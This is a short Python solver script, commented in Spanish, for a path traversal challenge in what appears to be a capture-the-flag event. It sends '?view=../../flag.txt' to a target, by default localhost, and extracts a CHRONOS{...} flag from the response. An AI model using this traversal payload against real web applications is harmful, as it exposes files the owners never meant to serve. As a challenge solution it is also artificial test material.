#!/usr/bin/env python3
"""
ChronosCTF 2026 - Exploit Automatizado
Reto: Ruta Prohibida (Path Traversal)
"""

import sys
import re
import urllib.request
import urllib.parse


def solve(target_url: str) -> bool:
    print(f"[*] Conectando con el objetivo: {target_url}")
    exploit_url = target_url.rstrip("/") + "/?view=../../flag.txt"
    
    req = urllib.request.Request(exploit_url, method="GET")
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            html = response.read().decode("utf-8")
            
            match = re.search(r"CHRONOS\{[^}]+\}", html)
            if match:
                flag = match.group(0)
                print(f"[+] ¡Éxito! Flag recuperada: {flag}")
                return True
            else:
                print("[-] No se encontró la bandera en la respuesta.")
                return False
    except Exception as e:
        print(f"[-] Error durante la solicitud HTTP: {e}")
        return False


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5001"
    success = solve(url)
    sys.exit(0 if success else 1)
